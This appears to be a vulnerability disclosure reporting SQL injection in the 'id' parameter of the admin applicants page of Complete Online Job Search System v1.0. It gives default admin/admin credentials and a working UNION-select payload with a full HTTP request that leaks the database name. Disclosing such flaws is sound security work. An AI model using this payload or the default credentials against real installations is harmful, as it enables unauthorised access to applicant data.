# Complete Online Job Search System v1.0 has SQL injection

BUG_Author：朝阳

The password for the backend login account is: admin/admin

vendors: https://www.campcodes.com/projects/php/online-job-search-system-using-php-mysql-free-download/

Vulnerability File: /eris/admin/applicants/index.php?view=view&id=

Vulnerability location: /eris/admin/applicants/index.php?view=view&id=,id

Current database name: erisdb

[+] Payload: /eris/admin/applicants/index.php?view=view&id=-2%27%20union%20select%201,2,3,4,5,6,database(),8,9,10,11--+ // Leak place ---> id

```sql
GET /eris/admin/applicants/index.php?view=view&id=-2%27%20union%20select%201,2,3,4,5,6,database(),8,9,10,11--+ HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=mho0fs263l0tis8l6v3lqpu6q4
Connection: close
```

![image](https://user-images.githubusercontent.com/54017627/170849174-963d07c5-d498-446e-b8e5-b834c6c1c4f4.png)


![image](https://user-images.githubusercontent.com/54017627/170849170-e85f655d-3180-4a60-abac-0f26005b0093.png)
